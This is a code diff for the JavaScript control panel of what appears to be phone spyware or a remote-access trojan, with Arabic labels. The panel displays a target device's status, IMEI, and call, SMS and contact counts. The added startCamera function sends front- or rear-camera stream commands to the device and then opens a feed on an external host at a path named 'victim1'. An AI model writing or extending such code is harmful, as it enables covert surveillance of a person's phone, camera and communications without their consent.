@@ -172,33 +172,26 @@ async function updateLiveData() {
         const response = await fetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
         const data = await response.json();
         
-        // ✅ الحالة
         const statusEl = document.getElementById('networkStatus');
         if (data.online) { statusEl.textContent = 'متصل'; statusEl.className = 'value online'; }
         else { statusEl.textContent = 'غير متصل'; statusEl.className = 'value offline'; }
         
-        // ✅ نوع الشبكة
         const networkTypeEl = document.getElementById('networkType');
         if (networkTypeEl) networkTypeEl.textContent = data.network_type || '—';
         
-        // ✅ اسم الشبكة
         const networkNameEl = document.getElementById('networkName');
         if (networkNameEl) networkNameEl.textContent = data.network_name || '—';
         
-        // ✅ قوة الإشارة
         const signalEl = document.getElementById('signalStrength');
         if (signalEl) signalEl.textContent = data.signal_strength || '—';
         
-        // ✅ البطارية
         if (data.battery !== null && data.battery !== undefined) {
             document.getElementById('batteryStatus').textContent = data.battery + '%';
         }
         
-        // ✅ حالة البطارية
         const batteryStateEl = document.getElementById('batteryState');
         if (batteryStateEl) batteryStateEl.textContent = data.battery_status || '—';
         
-        // ✅ آخر اتصال
         if (data.last_seen) {
             const lastSeenEl = document.getElementById('lastSeen');
             if (lastSeenEl) {
@@ -207,7 +200,6 @@ async function updateLiveData() {
             }
         }
         
-        // ✅ العدادات
         if (data.call_count !== undefined) document.getElementById('callCount').textContent = `(${data.call_count})`;
         if (data.sms_count !== undefined) document.getElementById('smsCount').textContent = `(${data.sms_count})`;
         if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
@@ -468,6 +460,44 @@ async function loadDeviceInfo() {
         const div = document.getElementById('deviceInfo');
         if (!info || Object.keys(info).length === 0) return;
         div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
+    } catch (e) {}
+}
+
+// ✅ وظائف الكاميرا
+async function startCamera(type) {
+    if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
+    
+    try {
+        const command = type === 'front' ? 'START_FRONT_STREAM' : 'START_REAR_STREAM';
+        
+        await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device: currentDevice, command: command })
+        });
+        
+        showNotification('📸', 'تم تشغيل الكاميرا', '📸');
+        
+        setTimeout(() => {
+            window.open('https://camera-z9lw.onrender.com/stream/victim1', '_blank');
+        }, 5000);
+        
+    } catch (e) {
+        showNotification('❌', 'فشل تشغيل الكاميرا', '❌');
+    }
+}
+
+async function stopCamera() {
+    if (!currentDevice) return;
+    
+    try {
+        await fetch('/api.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ device: currentDevice, command: 'STOP_STREAM_SERVER' })
+        });
+        
+        showNotification('⏹️', 'تم إيقاف الكاميرا', '⏹️');
     } catch (e) {}
 }
 
